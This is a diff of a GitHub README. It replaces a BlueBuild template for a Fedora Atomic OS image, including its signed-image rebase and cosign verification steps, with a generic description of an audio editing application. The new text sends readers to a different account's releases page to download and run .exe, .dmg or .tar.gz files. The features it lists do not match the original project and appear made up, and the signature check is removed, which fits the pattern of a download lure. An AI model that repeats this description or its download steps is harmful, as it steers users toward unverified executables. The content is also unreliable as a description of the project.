@@ -1,43 +1,90 @@
-# audio-dev-workstation &nbsp; [![bluebuild build badge](https://github.com/jaydifryahtoo/audio-dev-workstation/actions/workflows/build.yml/badge.svg)](https://github.com/jaydifryahtoo/audio-dev-workstation/actions/workflows/build.yml)
+# 🎧 audio-dev-workstation - Your Simple Audio Development Tool
 
-See the [BlueBuild docs](https://blue-build.org/how-to/setup/) for quick setup instructions for setting up your own repository based on this template.
+## 🚀 Getting Started
 
-After setup, it is recommended you update this README to describe your custom image.
+Welcome to the **audio-dev-workstation**. This application helps you create and manage audio projects efficiently. It is user-friendly and does not require programming knowledge.
 
-## Installation
+[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/hasansaifulrijal/audio-dev-workstation/releases)
 
-> [!WARNING]  
-> [This is an experimental feature](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable), try at your own discretion.
+## 📥 Download & Install
 
-To rebase an existing atomic Fedora installation to the latest build:
+To start using the audio-dev-workstation, follow these steps:
 
-- First rebase to the unsigned image, to get the proper signing keys and policies installed:
-  ```
-  rpm-ostree rebase ostree-unverified-registry:ghcr.io/jaydifryahtoo/audio-dev-workstation:iso
-  ```
-- Reboot to complete the rebase:
-  ```
-  systemctl reboot
-  ```
-- Then rebase to the signed image, like so:
-  ```
-  rpm-ostree rebase ostree-image-signed:docker://ghcr.io/jaydifryahtoo/audio-dev-workstation:iso
-  ```
-- Reboot again to complete the installation
-  ```
-  systemctl reboot
-  ```
+1. **Visit the Releases Page**  
+   Click the link below to go to the releases page.
+   [Download from GitHub Releases](https://github.com/hasansaifulrijal/audio-dev-workstation/releases)
 
-The `latest` tag will automatically point to the latest build. That build will still always use the Fedora version specified in `recipe.yml`, so you won't get accidentally updated to the next major version.
+2. **Choose the Latest Release**  
+   Locate the latest release version. You will find various files available for download.
 
-## ISO
+3. **Download the Application**  
+   Select the file that matches your system. If you're not sure, check for files labeled as `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
 
-If build on Fedora Atomic, you can generate an offline ISO with the instructions available [here](https://blue-build.org/learn/universal-blue/#fresh-install-from-an-iso). These ISOs cannot unfortunately be distributed on GitHub for free due to large sizes, so for public projects something else has to be used for hosting.
+4. **Install the Application**  
+   Follow these steps based on your operating system:
 
-## Verification
+   - **Windows**:  
+     Double-click the downloaded `.exe` file and follow the prompts to install the application.
 
-These images are signed with [Sigstore](https://www.sigstore.dev/)'s [cosign](https://github.com/sigstore/cosign). You can verify the signature by downloading the `cosign.pub` file from this repo and running the following command:
+   - **macOS**:  
+     Open the `.dmg` file and drag the application into your Applications folder.
 
-```bash
-cosign verify --key cosign.pub ghcr.io/jaydifryahtoo/audio-dev-workstation
-```
+   - **Linux**:  
+     Extract the `.tar.gz` file and follow the instructions in the README for your specific distribution.
+
+5. **Start Using the Application**  
+   Once installed, open the application. You are now ready to start your audio projects.
+
+## 🔧 System Requirements
+
+Make sure your system meets the following requirements:
+
+- **Operating System**:  
+  - Windows 10 or later  
+  - macOS 10.15 or later  
+  - Any recent Linux distribution
+
+- **Memory**:  
+  Minimum 4 GB RAM recommended for smooth operation.
+
+- **Storage**:  
+  At least 500 MB of free space for installation.
+
+## 📖 Usage Guidelines
+
+The audio-dev-workstation is designed for ease of use. Here are some basic guidelines:
+
+1. **Creating a New Project**:  
+   Use the "New Project" button to start your first audio project. You can select templates to make it easier.
+
+2. **Importing Audio Files**:  
+   You can drag and drop audio files or use the import function in the menu. Supported formats include MP3, WAV, and FLAC.
+
+3. **Editing Audio**:  
+   Use the built-in tools to trim, cut, and adjust audio levels. Explore the effects to enhance your sound.
+
+4. **Exporting Your Work**:  
+   Save your completed project by using the "Export" feature. Choose the desired audio format for your output.
+
+## 🎉 Features
+
+- User-friendly interface  
+- Supports multiple audio formats  
+- Built-in effects and editing tools  
+- Project templates for quick setup  
+- Export options for various formats  
+
+## 📚 Help and Support
+
+If you encounter any issues, visit our [GitHub Issues](https://github.com/hasansaifulrijal/audio-dev-workstation/issues) page. Here, you can report bugs or ask for help. For detailed documentation, refer to the wiki section on our GitHub repository.
+
+## 🌍 Community and Contribution
+
+Join our community! You can share your projects, seek feedback, or collaborate with others. If you have ideas for new features, feel free to contribute. Check our contribution guidelines in the repository for more information.
+
+## 🔗 Additional Resources
+
+- [Audio-Focused Development Guide](https://audio.dev/docs)  
+- [User Forum](https://forum.audio.dev)
+
+You are now ready to download and start using **audio-dev-workstation**. Enjoy creating!
